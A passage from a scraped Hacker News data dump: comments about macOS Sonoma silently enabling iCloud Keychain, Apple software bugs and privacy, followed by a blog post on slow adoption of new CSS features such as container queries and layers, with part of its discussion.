random failure. Like at least once a week it'll inexplicably fail to get notifications or fail to answer phone calls. And then once a month I'll have to power cycle both the watch and the phone because they fall into a trap where any call in/out fails. I first noticed these bugs on my s4 and iphone xs. I'm currently using an s8 and iphone 13. Still got those bugs lol. Oh I thought of one more. Any iOS device with a home button and an alphanumeric password won't show you the keyboard when it first starts up. You have to hit the power button and then wake it with the home button to see the keyboard lol. reply walterbell 21 hours agorootparent> Any iOS device with a home button and an alphanumeric password won't show you the keyboard when it first starts up. You have to hit the power button and then wake it with the home button to see the keyboard lol. Thanks for explaining iPhone SE2/SE3 behavior. iOS Magnifier (for blind people!) will randomly stop speaking \"image descriptions\", continuing onscreen, invisible to the blind user. reply dukeofdoom 21 hours agorootparentprevI just got a regular mouse ear alarm clock. The phone one has bugged out on me before, can't trust it now. reply WWLink 10 hours agorootparenthahaha That's so classic Apple. It used to happen very often with daylight savings time. The funny part is I use the sleep app and the alarms. When I'm really worried about missing an alarm I set my android phone too, or the alarm clock by my bed lol. That rarely is needed. reply Rinzler89 21 hours agorootparentprevWhat's a mouse ear alarm clock? reply saagarjha 20 hours agorootparenthttps://upload.wikimedia.org/wikipedia/commons/e/ef/Alarm_Cl... reply aldur 11 hours agoparentprevI have experienced multiple iCloud-related bugs across all devices, not just Apple Watch. First I had Keychain taking a full core on _all_ my devices and had to go through a rabbit hole to fix it [0], then I had “fileproviderd “ do the same (again, across all devices) and had to delete iCloud DB to fix it. I wonder how less tech-savvy users are supposed to notice the issue (and maybe fix them). [0]: https://aldur.pages.dev/articles/2024/05/22/secd reply dmz73 18 hours agoparentprevCareful about negative comments about testers - Apple (as well as all other companies) is now testing in production so users are Apple's testers. reply lhamil64 15 hours agorootparentBut that implies they'll fix the bugs that get reported! I have a Google Pixel 6a, and for probably close to a year now I've had this weird issue where vibration randomly stops working, but only when I'm not connected to wifi. Rebooting the phone fixes it temporarily. I've submitted feedback in the settings to report it multiple times and it's still not fixed. I've had another bug where people get a sporadic echo when I'm on the phone with them, but it doesn't happen when I'm on speaker or using a different app to call (like Discord). I'm thinking of changing brands when I upgrade. Guess I shouldn't look too closely at getting an iPhone either... reply tiltowait 15 hours agoparentprevMy watch decided to stop correctly syncing DND mode. It would turn on with the phone but not turn off. This would happen 3-4 times a week—enough to be far more aggravating than it really should be. Then Apple made some annoying decisions with watchOS 10, and I stopped using it altogether. reply TexanFeller 15 hours agoparentprevYMMV. Both my Ultra and Ultra2 worked perfectly. reply SahAssar 21 hours agoparentprev> I'm convinced that QA at Apple is run by primate apes. If you yourself is not a primate ape I would be surprised and call every news agency available to tell them a new species is using written language and the internet. reply jimkoen 21 hours agorootparentI tried to report issues with a broken VP9 decoder causing system instability in MediaToolBox on my Mac Mini but I need to pay 100$ to even get a chance for an Apple tech to see this issue in their developer forums (not that they engage much with their developer community at all). Apple is shipping broken software left and right ever since the ARM transition and it's become noticeable. reply dwaite 16 hours agorootparentYou are as likely to have an Apple engineer create a bug report for you on Apple's forums as you are here. http://feedbackassistant.apple.com is where you file such requests. Just keep in mind that the wall they have between public and internal systems means you may not get updates unless you periodically ask for them. reply slater 16 hours agorootparenta little bit of irony, considering this submission's website: https://lapcatsoftware.com/FeedbackAssistantBoycott/ reply SahAssar 21 hours agorootparentprevI was mostly replying to the implication that apple would be using anything other than primate apes for QA. What other species/order than primate apes do you think would be suitable for apple QA? reply karunamurti 18 hours agorootparentprevYeah, I would be surprised if they managed to have QA from species other than the species from Hominoidea family. reply genevra 19 hours agorootparentprev\"if you yourself is not a primate ape\"? reply SahAssar 2 hours agorootparentI was unsure of choosing \"is\"/\"are\" (is this not the third person singular present tense correct usage?), but besides that I felt like it was a coherent enough expression. The \"yourself\" might feel awkward but is required to ensure that I am talking about the specific poster instead of something like \"if you are not a X\" in which case it would read like a general you. If you understood what I was expressing and have a better and more succinct way to express it let me know. reply threeseed 20 hours agoparentprevBe curious what bugs you are referring to. I've had an Ultra since it launched and it's been no different to any other Apple Watch. reply gandalfgreybeer 16 hours agorootparentI have the exact same experience as you. I usually take comments like this with a grain of salt, especially if it’s a very general and non-specific complaint. reply fiddlerwoaroof 14 hours agorootparentThis is a phenomenon about Apple and some other companies I’ve never fully understood: charitably, there just are people with 1% setups that hit a whole class of bugs in Apple devices that I haven’t seen in 15 years or so reply samatman 21 hours agoparentprevI have seen absolutely nothing of the sort. My experience is that other than a larger screen and an extra button, the Ultra is just like the normal Apple watch which preceded it: reliable to an almost boring degree. To the point where I want to include some sort of caveat or flaw in my reply, lest I be accused of the dreaded fanboyism. Problem with that is that I don't have one. I can't think of a single bug or glitch in the 18 months I've had it. I guess I have one kvetch: there was a major OS version bump during which they disabled swiping between faces. They added it back as an option, which I promptly turned on, and that was that. reply hulitu 13 hours agoparentprev> There is no sensible explanation that a flagship device can be full of bugs and inferior quality to its 3-year older non-flagship counterparts. The rich customer does not buy Apple because of the quality, but because of the price. /s reply walterbell 21 hours agoprevFor maximum data isolation of hardware devices from Apple: - avoid storing anything on iCloud - disable iCloud via MDM / Apple Configurator policy profile - router block Apple network (17.0.0.0/8) connections - router block Apple CDNs via dnsmasq wildcard domains - router allow Apple servers for notifications and app/OS updates - login via App Store only, not Settings/iCloud Apple list by service: https://support.apple.com/en-us/101555 reply zelphirkalt 13 hours agoparentYou also might need to: - never take your precious Apple laptop outside - somehow make sure there is no other open WLAN nearby reply walterbell 12 hours agorootparentMobile firewall options include Little Snitch on macOS, VPN/tailscale on iOS/iPad to home router, or an LTE travel router. If using a travel router, Apple Configurator can limit Wi-Fi SSIDs. There are claims that some Apple traffic can bypass on-device iOS VPNs. reply zelphirkalt 1 hour agorootparentHow do you ensure that the OS does not by itself connect to a random open WLAN, when you cannot trust the OS? reply II2II 21 hours agoprev> why don't I just \"go with the flow\", adopt iCloud Keychain and passkeys? I don't like the \"on principle\" response since a lot of people will end up thinking, \"oh, so it doesn't really matter.\" Even the author's elaboration could lead to responses like: \"they are control freaks,\" or \"they are paranoid.\" In my case, the answer is simple: I have access to systems that contain confidential information about other people. Protecting their data is my responsibility. While I have little doubt that Apple (and other vendors that provide similar services) do their best to guarantee the security of these products, their centralized nature and potential value of the data it leads to make them very juicy targets. reply andrewaylett 21 hours agoparentI suspect that Apple (and Google) are going to be better at maintaining my privacy (at least from anyone who isn't Apple (or Google, respectively)) than I am. For the record, there's plenty of data I wouldn't want to give either company (especially Google) but the answer there is also fairly straightforward: I don't put my passwords into my iCloud Keychain. Or, for that matter, into Google's password manager. reply dijit 20 hours agorootparentI am your government. I am your doctor. I am your lawyer. I don't trust any company, let alone a foreign controlled one to have authorised access to my accounts as me. I would be held accountable if they were exposed and they sufficiently covered their tracks (and they are incentivised to try). Why should I brazenly permit this? (for the record, as a private individual I am using iCloud keychain, and for work I use 1password with its online storage: however I just make video games, I don’t have the power to destroy lives, nor do I have a responsibility to avoid it; I am merely pointing out that perfect being the enemy of good is not always good enough for everyone.) reply II2II 20 hours agorootparent> I don't trust any company It does not have to be a matter of trust. People make mistakes. The wrong mistake can lead to a vulnerability. Technology advances. What was considered secure 20 years ago is not considered secure today. Companies change hands and have changes in leadership. Then there is the question of: what does trusting a company mean? Their actions are the result of a multitude of minds, not a singular one. reply pomian 21 hours agoprevThat's great you posted this information. As someone who helps various other people with their computers, and a lot of them Macs, it's hard to stay on top of all nuances of trying to keep secure and private. Apple keeps doing things that are more Microsoft like, all the time. It is becoming extremely difficult to keep your own data, on your own machine. reply walterbell 21 hours agoparentAsahi Linux on Apple Silicon is increasingly attractive. reply firecall 19 hours agorootparentHopefully we will get good Linux support on those new ARM PCs! If it's not here already - I dont really follow the space :-) reply walterbell 16 hours agorootparentUpstream Linux is progressing, hopefully at least one major PC OEM invests in official Linux support with Ubuntu, https://news.ycombinator.com/item?id=40479941. If Apple allows VMs on iPad Pro in iOS 18, it might take some wind out of Oryon sails, but with Nvidia, Mediatek and maybe AMD joining the Arm train in the coming year, real competition lies ahead. A repairable Arm laptop from Framework would be great. reply umanwizard 21 hours agorootparentprevUnfortunately no support for M3 MBPs yet reply mixmastamyk 20 hours agorootparentprevIs it possible to install without mac os and/or internet access yet? reply TheNewsIsHere 16 hours agorootparentYou can do this if you effectively disable Secure Boot. The highest boot security setting, which ships as the default, requires an install-time certificate check. reply rock_artist 22 hours agoprevI don’t expect bug free software. But I do expect Apple to do minimal tests of the toggled off cases. It’s one of the biggest companies. Why can they test minimum trivial QA workflows? Why there’s always this bug where some toggle is broken resulting unintended data to be sent or downloaded? reply doubled112 20 hours agoparentI know I’m supposed to attribute things like this to incompetence, not malice, but how many times can a similar mistake repeat before it is not a mistake? Seems similar to how Windows settings “accidentally” revert to the less private ones. reply m463 19 hours agoprevWhat can make you more aware of apple's practices is to enable Little Snitch. It's not perfect, but it monitors what process on your system wants to make what network connection. What appalled me was that even when adding a LOCAL email account, accountsd tries to phone home to apple. Apple is phoning home in ways it never should. reply TheNewsIsHere 16 hours agoparentAgreed. Though for that specific feature, Apple operates a lookup service that Mail uses to attempt to automatically configure your SMTP and IMAP/POP settings. It would be nice if it asked permission first. reply crazygringo 20 hours agoprevFunny, I just checked and my iCloud keychain is not enabled. I've had it off for years (always?), and definitely upgraded to Sonoma when it prompted me, and it didn't re-enable it for me. My System Settings > Passwords says \"Turn on iCloud Keychain\" with two buttons \"Not Now\" and \"Enable\". (No idea what why there's a button \"Not Now\"?) But I don't use Keychain at all, I use a third-party password manager. At some points I'm sure Keychain has asked me if I wanted to save various passwords in Keychain and I've always said no. And it hasn't bugged me about it in a long time. I wonder why OP's systems are turning it on when mine didn't? reply justinclift 22 hours agoprevSeems like Apple have clearly gone from \"We take your privacy seriously!\" to \"We take your privacy, seriously!\". reply brutal_chaos_ 16 hours agoparentPerhaps I'm mistaken, but I'm pretty sure \"we take your privacy seriously\" has always been marketing and nothing more. they could say that because they aren't Google who really doesn't care about privacy. So in comparison, it was \"correct.\" Regardless, they are a company and companies can change their ideals at any point, so one should never take marketing strategies seriously (not that you did, just a general warning). reply Tagbert 14 hours agorootparentIt is both marketing and they have taken steps to protect privacy. In some cases they have made apps less functional or less simply because of privacy concerns. Of course that is not their only concern and they do have an obligation to make money, but it’s not a binary choice and saying that it is nothing more than marketing is reductionist cynicism. reply justinclift 13 hours agorootparentMaybe \"was reductionist cynicism\". Their present day approach makes it seems very plausible that it's just marketing and weasel words, nothing more. :( reply macintux 21 hours agoprevDiscussion from the previous blog post, a week ago: https://news.ycombinator.com/item?id=40409290 reply cjk2 22 hours agoprevTo quote the article \"I've always managed my data myself, taking personal responsibility for protecting it and backing it up. I don't want or need Apple to insert itself into this process as a remote nanny.\" But do this to sync to iCloud at all, you'd have to log into an Apple account in the first place on the machine. Surely that is counter to the requirement? reply FLT8 21 hours agoparentThere are other reasons to be logged into iCloud. For example, \"find my device\" relies on this. Just because you want to be able to find a stolen device doesn't mean you also want your data exfiltrated. reply csande17 21 hours agorootparentThe author also ships software on the Mac App Store that includes an option to sync settings via iCloud. Presumably they test it on their main user account to catch all the weird iCloud bugs that only occur if you use it frequently. reply walterbell 21 hours agoparentprevHow does one download app security updates without login? It's usually possible to login via the App Store, without logging into iCloud. reply justinclift 21 hours agorootparentYeah, that's the same setup I use. An Apple account for our dev membership and being able to download stuff (ie Xcode), but no iCloud usage at all. Neither need nor want iCloud anything. reply OsrsNeedsf2P 22 hours agoparentprevAgreed. This is OPs fault reply IndySun 10 hours agoprevWe know a software 'off' is not a definitive off. So it is, imho, and has been for a long time, extremely safe to assume that Apple takes all data from all devices as often and as much as it can even when things are 'turned off'. Apple does it very obviously with settings on podcast sync or music artwork, blatantly having those off settings turn on after any update. LittleSnitch and the like also point to nannying tickles. I am equally blood boiled, like LapCatSoftware, and would applaud a huge fine from either the USA gov or the EU or both. Apple MUST address this. The privacy mask is slipping in full view of more public. reply Tepix 14 hours agoprevThis \"bug\" really made me mad when it happened to me as well. It seems to be on purpose, it's happened multiple times over the years! reply peppertree 20 hours agoprevWhat are the best alternatives besides cloud keychains. Coming from sharing same password for multiple accounts, cloud keychain has been step up for me security wise. I'm honestly curious what are the better alternatives. reply walterbell 20 hours agoparentiOS/macOS/Win/Android Codebook, https://www.zetetic.net/codebook/ - no subscription - open-source encryption (SQLCipher) - device-to-device encrypted sync via ethernet/wifi, dropbox, google drive - indie US developer, lineage to 1998 STRIP on PalmPilot - TOTP 2FA authenticator - sync encrypted notes/images 1999, http://www.cnn.com/TECH/computing/9911/30/palm.tools.idg/ > Secure Tool for Recalling Important Passwords (STRIP). STRIP uses heavy-duty, 128-bit triple-Data Encryption Standard to store information, and that means any information -- credit-card numbers, Web site accounts and voice-mail access codes. STRIP (Zetetic Enterprises, free) is also a great tool for IT managers who administer distributed environments. It can random-generate complex passwords and allows account information to be beamed between Palms, so the IT staff can stay up-to-date. reply nc0 20 hours agoparentprev1Password is reputed. Or KeepassXC if you prefer something to self-host reply readams 20 hours agoparentprevSomething independent and cross platform like bitwarden. reply upon_drumhead 22 hours agoprev [–] I don't really understand the folks that use the platform and then talk about how completely untrustworthy it is. reply asadotzler 21 hours agoparentBecause this particular untrustworthiness manifested after the user adopted the platform. I don't really understand corporate bootlicking either, but I can at least take a minute to think about it before posting nonsense. reply lordofgibbons 19 hours agorootparent> Because this particular untrustworthiness manifested after the user adopted the platform. This company has shown multiple times in the past that they can and will change their closed source software's behavior to the detriment of user privacy (remember Apple's on-device image scanning?). Why are you or OP surprised when these things continue to happen on the closed source walled garden? reply Apocryphon 21 hours agoparentprevIt's kind of funny- I find myself to be on the critical side when it comes to Apple, especially on HN, but when it comes to iCloud Keychain I use it pretty unquestioning. Probably because I don't trust 1Password or other password managers to be any better, and it's a feature that's baked into the OS so adoption is frictionless. reply 8fingerlouie 11 hours agorootparentWhen it comes to trust it doesn't really matter what you use. In theory 1Password has the superior product, as they use MFA for accessing your vault, and your account password only allows access to the encrypted vault (unlike Bitwarden where your account password unlocks everything). But that is all theory, and you don't really know what really goes on behind the scenes, and it could all just be \"theater\". It probably isn't, but that's where the trust part comes in. Personally i doubt that Apple has any nefarious intent, and i believe their intention is to make stuff better and more secure, and that they protect/respect privacy. Again, this is a matter of trust, and i trust Apple. I don't base my assumptions on blind trust, but actually review their documentation on their services, like iCloud Data Security [^1]. They're pretty open about how they encrypt stuff, and also mention stuff like when using standard iCloud encryption, your backup of messages includes a key that can be used to decrypt the messages in the backup. I enabled Advanced Data Protection as soon as it became available, and stopped worrying about it. For stuff that i want to keep secret at all costs i use GPG or Cryptomator. As for Keychain i use a mix of Keychain and 1Password. Keychain for everything \"simple\" that i don't care about, i.e. websites that requires a login. It plays well with Hide my Email, and offers the path of least resistance. My 1Password usage is mostly stuff that doesn't fit easily into Keychain. [^1] : https://support.apple.com/en-us/102651 reply ric129 21 hours agoparentprevThere's an inherent trade-off in everything Besides, in this case.. it does not help that you'd also have to exchange hardware reply ben_w 21 hours agoparentprevPick your poison, everything else is also broken. reply upon_drumhead 21 hours agorootparentSure, but if you fully believe that the platform is untrustworthy, that seems like the ultimate dealbreaker for someone who is concerned about their data privacy. It's the juxtaposition of \"I don't trust this platform at all\" and \"I put my data that must remain private on it\" that I don't understand. reply dkarras 20 hours agorootparentTrusthworthy has two meanings here. I trust that Apple does have no intention to look into my private data. I think they'd rather have no way of getting into it while providing the services as that minimizes their liability. In that sense they are trustworthy. But you might not trust them to be secure enough to store that data. Or maybe it has nothing to do with Apple, maybe you don't want your keychain in the \"cloud\" ever. I trust Apple does not intend to be nefarious, I don't trust (the security of) any \"cloud\" to store sensitive data. Those are not conflicting positions to be in. reply overstay8930 20 hours agoparentprevSeriously, you have to be so detached from reality to think iCloud Keychain sync is an issue at all, you just have to believe Apple put a backdoor their own TPM chip so they could decrypt your Keychain with a software update without human interaction. If you’re this distrustful of Apple, your logic should say to not use local Keychain at all. You either trust Apple’s hardware backed E2EE or you don’t trust anything from Apple at all, there’s no picking and choosing when it comes to this sort of thing. I bet privacy researchers at Apple are facepalming reading these threads thinking people can run their own crypto better than they can. reply 8fingerlouie 10 hours agorootparentI fully agree. > thinking people can run their own crypto better than they can Running or developing ? You can probably run something like Password Store [1] fairly secure, though you still have to trust the operating system not to leak your secrets, and it turns out that today, regardless of your choice, all major operating systems more or less synchronize your data to the cloud. I know Linux doesn't do it (Ubuntu tried some Amazon partnership once), but Linux is a poor match for many workplaces where Windows or MacOS are kings. Yes, you can run VSCode (or Vim/Emacs or whatever) on Linux, but running Photoshop, Fusion365 or various other business tools is not as \"easy\" as on Windows/MacOS, and in the end a company only has so many IT support staffers. [1]: https://www.passwordstore.org/ reply revscat 21 hours agoparentprev [–] No one is fully trustworthy. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Updating from macOS Ventura to Sonoma silently enables iCloud Keychain, even with precautions taken.",
      "Issues encountered include System Settings crashing, a persistent \"Some iCloud Data Isn't Syncing\" warning, and a \"zombie\" keychain in Keychain Access.",
      "The author criticizes Apple's software quality and privacy practices, expressing frustration over forced iCloud Keychain usage and default passkeys for App Store Connect logins."
    ],
    "commentSummary": [
      "A user reported that macOS Sonoma enabled iCloud Keychain without consent, leading to a broader discussion on Apple's declining software quality.",
      "Commenters shared various bugs in Apple devices, including high CPU usage by Keychain and persistent issues across multiple generations, raising concerns about Apple's quality control and software reliability.",
      "The debate extended to Apple's QA processes, data privacy, and the trustworthiness of password managers, with some users considering alternatives like Linux for fewer intrusive features."
    ],
    "points": 161,
    "commentCount": 86,
    "retryCount": 0,
    "time": 1716754711
  },
  {
    "id": 40484802,
    "title": "Overcoming Resistance: Integrating New CSS Techniques Gradually",
    "originLink": "https://mxb.dev/blog/old-dogs-new-css-tricks/",
    "originBody": "Old Dogs, new CSS Tricks 26 May 2024 ⋅ code A lot of new CSS features have shipped in the last years, but actual usage is still low. While there are many different reasons for the slow adoption, I think one of the biggest barriers are our own brains. # New feature fatigue Right now, we’re in the middle of a real renai-css-ance (the C is silent). It’s a great time to write CSS, but it can also feel overwhelming to keep up with all the new developments. Prominent voices at conferences and on social media have been talking about the new stuff for quite some time, but real-world usage seems to lag behind a bit. Quick question: how many of these have you actively used in production? Container Queries Style Queries CSS Layers Subgrid Native CSS Nesting :has, :is, :where Dialog, Popover Logical Properties Scroll-Linked Animations View Transitions 👉 (Disclaimer: I’ve used one.) All of these are very useful, and support for most is pretty good across the board - yet adoption seems to be quite slow. Granted some things are relatively new, and others might be sort of niche-y. But take container queries, for example. They were the number one feature requested by front-end devs for a looong time. So why don’t we use them more, now that they’re finally here? From my own experience, I think there’s different factors at play: # The support excuse I can’t use [feature X], I need to support [old browser]. That old chestnut. Browser support is an easy argument against most new things, and sometimes a convenient excuse not to bother learning a feature. The answer there is usually progressive enhancement - except that’s easier to do for actual “enhancements”, if they are optional features that don’t impact the usability of a site that much. For some of the new features, theres no good path to do this. CSS Layers or native nesting for example are not something you can optionally use, they’re all-or-nothing. You’d need a separate stylesheet to support everyone. And while support for Container Queries is green in all modern browsers, people still seem reluctant to go all-in, fearing they could break something as fundamental as site layout in older browsers. # Invisible improvements Why use [feature X] if the usual way works fine? Some of you might be old enough to remember the time when CSS3 features first hit the scene. Things like border radius or shadows were ridiculously hard to do back in the day. Most of it was background images and hacks, and it required a substantial amount of work to change them. Suddenly, these designs could be achieved by a single line of CSS. Writing border-radius: 8px instead of firing up Photoshop to make a fucking 9-slice image was such a no-brainer that adoption happened very quickly. As soon as browser support was there, nobody bothered with the old way anymore. A big chunk of the new features today are “invisible” though - they focus more on code composition and architecture. Layers, Container Queries, etc are not something you can actually see in the browser, and the problems they solve may not be such an obvious pain in the ass at first glance. Of course they offer tremendous advantages, but you can still get by without using any of them. That might slow down adoption, since there is no urgency for developers to switch. # Examples and design trends I don’t know where I would even use [feature X] in my project. The initial use-case for container queries I always heard was “styling an element that could be in the main column or the sidebar”. I think that came from a very common WordPress blog design at the time where you had “widgets” that could be placed freely in different-width sections of the site. Nowadays, the widget sidebar isn’t as common anymore; Design trends have moved on. Of course there are plenty of other use-cases for CQs, but the canonical example in demos is usually still a card component, and people seemed to struggle for a while to find other applications. The bigger issue (most recently with masonry grids) is that sometimes the need for a CSS feature is born out of a specific design trend. Standards move a lot slower than trends though, so by the time a new feature actually ships, the need might not be that strong anymore. Spec authors do a very good job of evaluating the long-term benefits for the platform, but they also can’t predict the future. Personally, I don’t think the new features are tied to any specific design - but I think it’s important to show concrete, real-world usecases to get the developer community excited about them. # Breaking the habit Whatever the technical reasons may be, I guess the biggest factor in all of this are our own habits. Our monkey brains still depend on patterns for problem solving - if we find a way of doing things that works, our minds will quickly reach for that pattern the next time we encounter that problem. While learning the syntax for any given CSS feature is usually not that hard, re-wiring our brains to think in new ways is significantly harder. We’ll not only have to learn the new way, we’ll also have to unlearn the old way, even though it has become muscle memory at this point. So how can we overcome this? How can we train ourselves to change the mental model we have for CSS, or at least nudge it in the new direction? # Re-thinking established patterns If we want to adopt some of the broader new architectural features, we need to find ways to think about them in terms of reusable patterns. One of the reasons BEM is still holding strong (I still use it myself) is because it provides a universal pattern of approaching CSS. In a common Sass setup, any given component might look like this: // _component.scss .component { // block styles position: relative; // element styles &__child { font-size: 1.5rem; } // modifier styles &--primary { color: hotpink; } // media queries @include mq(large) { width: 50%; } } The BEM methodology was born in an effort to side-step the cascade. While we now have better scoping and style encapsulation methods, the basic idea is still quite useful - if only as a way to structure CSS in our minds. I think learning new architectural approaches is easier if we take existing patterns and evolve them, rather than start from scratch. We don’t have to re-invent the wheel, just put on some new tyres. Here’s an example that feels similar to BEM, but sprinkles in some of the new goodness: /* component.css */ /* Layer Scope */ @layer components.ui { /* Base Class */ .component { /* Internal Properties */ --component-min-height: 100lvh; --component-bg-color: #fff; /* Block Styles */ display: grid; padding-block: 1rem; min-block-size: var(--component-min-height); background-color: var(--component-bg-color); /* Child Elements, Native CSS Nesting */ & :is(h2, h3, h4) { margin-block-end: 1em; } /* States */ &:focus-visible { scroll-snap-align: start; } &:has(figure) { gap: 1rem; } /* Style Queries as Modifiers */ @container style(--type: primary) { font-size: 1.5rem; } /* Container Queries for component layout */ @container (min-inline-size: 1000px) { --component-min-height: 50vh; grid-template-columns: 1fr 1fr; } /* Media Queries for user preferences */ @media (prefers-color-scheme: dark) { --component-bg-color: var(--color-darkblue); } @media (prefers-reduced-motion: no-preference) { ::view-transition-old(component) { animation: fade-out 0.25s linear; } ::view-transition-new(component) { animation: fade-in 0.25s linear; } } } } My preferred way of learning new techniques like that is by tinkering with stuff in the safe playground of a side project or a personal site. After some trial and error, a pattern might emerge there that sort of feels right. And if enough people agree on a pattern, it could even become a more common convention. # One step at a time When learning new things, it’s important not to get overwhelmed. Pick an achieveable goal and don’t try to refactor an entire codebase all at once. Some new features are good candidates to test the water without breaking your conventions: You can try to build a subtle view transition as a progressive enhancement to your site, or you could build a small component that uses container queries to adjust its internal spacing. In other cases, browser support also does not have to be 100% there yet. You can start using logical properties in your project today and use something like postcss-logical to transform them to physical ones in your output CSS. Whatever you choose, be sure to give yourself enough space to experiment with the new stuff. The devil is in the details, and copy-pasting some new CSS into your code usually doesn’t give you the best insight - kick the tyres a bit! # Finding inspiration One thing I’d really love to see more of are “best practice” examples of complete sites, using all the new goodness. They help me see the bigger picture of how all these new techniques can come together in an actual real-life project. For me, the ideal resource there are (again) the personal sites of talented people. How do they structure their layers? How do they set up containers? What sort of naming conventions do they use? What problems are they solving, and how does the new architecture improve things? Answering these questions helps me to slowly nudge my brain into new ways of thinking about all this. Having said all that: you absolutely don’t have to use all the latest and greatest CSS features, and nobody should feel guilty about using established things that work fine. But I think it helps to know which specific problems these new techniques can solve, so you can decide whether they’re a good fit for your project. And maybe we can still learn some new CSS tricks after all. Published in [code] ⋅ 26 May 2024 Edit this Post Follow @mxbck",
    "commentLink": "https://news.ycombinator.com/item?id=40484802",
    "commentBody": "Old dogs, new CSS tricks (mxb.dev)156 points by mxbck 23 hours agohidepastfavorite87 comments bruce511 15 hours ago>> But take container queries, for example. They were the number one feature requested by front-end devs for a looong time. So why don’t we use them more, now that they’re finally here? A number of things are in play here. 1) when people ask for something it's because they need it now. The client wants it to look like x. Providing it a year later doesn't mean I'll retro-fit it, I'm working for another client now. 2) the new features on offer are (mostly) not low-hanging fruit. 20 years ago we were asking for the basics - not-table layout (flex, grid), variables (var --), conditionals (@media) and so on. The low hanging fruit stuff. Now \"most people\" aren't really asking for anything. (The sliver of a minority attending css conferences naturally are dreaming up new edge cases.) 3) most of the websites that exist (aka have been styled) are older than these features. Since redesigns are typically multiple years apart it takes years for them to filter in. As a proportion the number of sites built, or updated, in the last year is small. And the proportion of those needing these features is smaller. 4) most sites are not styled from an empty notepad. Most use (reuse) a framework - either personal or public. CSS is starting to move from mid-stage to late-stage development. We're well passed the \"terrible to work with\" stage, well passed the \"good enough\" stage, and now into the \"what can we dream up stage\". That said I can see myself using some of these things - sub-grid and :has being the obvious ones for me. reply Cyberdog 9 hours agoparentVery good take. CSS is at a point of complexity now where you can't really blame anyone for not knowing everything you can do with it or every new feature that's been adopted in the last couple years, especially for full-stackers like me. I know a lot, including more than enough to get my job done, and though I will still learn new things now and then (I didn't know container queries existed before this article and now that I do I may use them in the future), I'm not in a hurry to learn every new bleeding-edge feature which are probably just going to cause compatibility issues for some non-insignificant number of my clients' browsers (or my clients' clients' browsers) anyway. Also, as someone who started doing web dev professionally nearly 20 years ago where if it didn't work in IE 6 then you just couldn't use it at all, I just instinctually don't even bother with new (as in 3-4 years old) CSS or JS features most of the time. It's pretty deeply ingrained in me and I suspect many other devs who were around in that time. That said, 5-year-old CSS and JS specs at this point are pretty damn good and you can do a whole lot of cool stuff with them, so this is not nearly as painful now as it was back then. Good enough is good enough. reply patates 7 hours agorootparent> I just instinctually don't even bother with new (as in 3-4 years old) CSS or JS features most of the time. It's pretty deeply ingrained in me and I suspect many other devs who were around in that time. I'm also a web dev with nearly 20 years and do exactly this as well. Old versions (or any version of) IE crushed our dreams too many times to feel comfortable delivering anything modern, let alone cutting edge. reply Chris_Newton 5 hours agorootparentAs a developer of a similar vintage, I can relate to this mindset, but I think we should be careful about it. We learned in an era when differences in browser behaviour were a big deal and new versions of browsers sometimes came along years apart. But those days are long gone — even Safari now gets several updates each year — and we should let the habits they created go with them. Should we be cautious about relying on non-standard features or trusting the perma-beta culture that Google never seems to have grown out of? Of course. But there have been many recent developments that are useful and already widely supported, and not using those when they provide a good solution to an immediate problem seems counterproductive. reply lobsterthief 6 hours agorootparentprevSame here (>20 years at this point)—I just know how to do nearly everything with existing CSS features, or else I’m already using a framework like MUI that eliminates a lot of the issues the new CSS features aim to solve. For example, the unique class names and low specificity offered by MUI negates the need for the new container functionality. I’ve definitely used :has() though to replace the need for certain CSS combinators—for example, being able to style a label that wraps a checkbox based on the checkbox being checked, rather than relying on the next-sibling combinator while placing the label after the checkbox input. That’s pretty cool and solves some limitations that existed previously. reply atoav 14 hours agoparentprevYeah, I still remember a site where I really would have needed the :has selector, but I have written a workaround in JS and now I would rather so the whole thing new than fix that tiny aspect. I will however definitely rely on the has: selector next time I encounter that situation (it had to do with markdown output putting img tags inside paragraphs, so I needed css that treats a paragraph that has a img inside differently than other paragraphs). reply noduerme 11 hours agorootparentDoes :has function as a parent selector? That's probably the only thing I ever really wanted from CSS and I assumed it would never happen because of the (back propagating) implications for the order the DOM is rendered in. reply atoav 10 hours agorootparentYes, because that was truly a gap in waht could be selected. Here is a blog post outlining what can be done using :has https://webkit.org/blog/13096/css-has-pseudo-class/ reply CM30 8 hours agoparentprevYeah, I think the first factor is probably the biggest one here. Devs tend not to rebuild existing sites on a whim, especially not to integrate new technology for the hell of it. We'll almost certainly see more container queries used on new website/app development projects going forward, but any that started prior to their integration into most browsers are likely going to remain using the old design philosophy with media queries instead. reply Flimm 11 hours agoprevFor me personally, it's because I've been burned too many times by blog posts announcing that \"feature X is here!\", when in reality, it's only here in Chrome or behind a feature flag, or the exciting parts haven't been implemented yet. Even this blog post falls into the same trap. There isn't good cross-browser support for view transitions or anchor positioning, and yet they're listed as here now. reply bramus 1 hour agoparentView transitions are the perfect candidate progressive enhancement. If the browser supports it, then the user will get the rich animations. If it doesn’t, then they get what they currently have. And once other browsers starts supporting it, the experience will automatically work in those browsers too without you needing to touch a single line of code :) reply leephillips 4 hours agoparentprevIt does not fall into the trap: “Granted some things are relatively new, and others might be sort of niche-y.” reply sir_pepe 13 hours agoprevThe real problem in my experience is that people who consider themselves to be \"real\" developers don't care about CSS. I do a ton of code reviews and consulting for companies of all sizes and their JavaScript and TypeScript is almost always at least in a borderline defensible state? But CSS is always one giant file that has been growing since 2002 and is treated as an append-only log of !important. Nobody even tries to fix their CSS because nobody can imagine the concept of \"well written CSS\". It's like JavaScript in the early 2000s, where the language has (in the minds of developers) to be worked around with stuff like tailwind. reply graftak 12 hours agoparentCss scoping has been fixed for ages already by css modules, styled components, or/and (native) support for nested css declarations. If those all fail there’s namespace conventions like BEM. If your css is a mess in 2024 (2016 really) it is all on the developer and not the language. reply _heimdall 1 hour agorootparentFixing scoping in userland, like with styled components or BEM, is definitely doable but not really the same as having native support for scoped styles in CSS. There's nothing wrong with those solutions and I've used those and similar plenty, but they are fragile. Those are conventions that have to be maintained and stuck with, and often for scoped style solutions you're also left with a hard dependency on a build step (BEM is an exception there). That may not be a problem at all, if you're using react you almost certainly already have a build and bundle step, but not every project is that way. reply lenkite 7 hours agoparentprevCSS needs a compiler with warnings, dead-code removal, type safety, modularization, standard structuring and \"design patterns\" - then software engineers will take it seriously. reply _heimdall 59 minutes agorootparentWe do have tools for that though, how would a build tool fit into a language specification? Aren't those different concerns? reply gonzo41 12 hours agoparentprevYou are not wrong. But my god, the tech debt in any slightly older web app's CSS is bonkers. Even with really well thought out templates you still end up with ~5000 line css files that have all sorts of state and 